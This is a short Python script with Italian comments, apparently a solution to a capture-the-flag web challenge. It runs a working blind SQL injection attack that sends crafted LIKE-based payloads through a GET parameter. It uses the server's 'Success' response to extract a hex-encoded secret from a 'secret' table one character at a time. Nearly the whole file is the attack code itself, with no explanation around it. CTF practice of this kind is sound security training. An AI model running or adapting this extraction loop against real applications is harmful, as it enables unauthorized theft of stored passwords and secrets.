import requests

class Inj:
    def __init__(self, base_url):
        """
        Inizializza la classe con l'URL di base del server target.
        """
        self.base_url = base_url

    def blind(self, payload):
        """
        Invio del payload SQL Injection al server.
        Il payload è passato come parametro di una richiesta GET.
        """
        try:
            # Invia il payload come parametro GET
            print(payload)
            response = requests.get(self.base_url, params={'query': payload})
            print(response.status_code)
            print(response.text)

            if response.status_code == 200:
                
                # Analizza la risposta per determinare successo o fallimento
                if 'Success' in response.text:  # Adatta in base alla risposta del server
                    return 'Success', None
                else:
                    return 'Failure', None
            else:
                return None, f"HTTP Error: {response.status_code}"
        except Exception as e:
            return None, str(e)


class PasswordFinder:
    def __init__(self, url, dictionary='0123456789abcdef'):
        """
        Inizializza la classe per la ricerca della password.
        """
        self.inj = Inj(url)
        self.dictionary = dictionary
        self.result = ''

    def find_password(self):
        """
        Cerca la password utilizzando attacchi SQL Injection con la tecnica blind.
        """
        print("Starting password discovery...")
        while True:
            found_char = False
            for c in self.dictionary:
                print(c)
                question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{self.result + c}%')='1"
                try:
                    response, error = self.inj.blind(question)
                    if response == 'Success':  # Match trovato
                        self.result += c
                        print(f"[+] Found character: {c} -> Current password: {self.result}")
                        found_char = True
                        break
                except Exception as e:
                    print(f"[!] Error: {e}")
            if not found_char:
                print("[*] No more characters found. Password discovery complete.")
                break

        return self.result


# Esempio di utilizzo
if __name__ == "__main__":
    # URL del server target (modifica secondo necessità)
    url = 'http://web-17.challs.olicyber.it'
    
    # Inizializza il PasswordFinder
    finder = PasswordFinder(url)
    
    # Avvia la ricerca della password
    password = finder.find_password()
    print(f"[!] Final password: {password}")
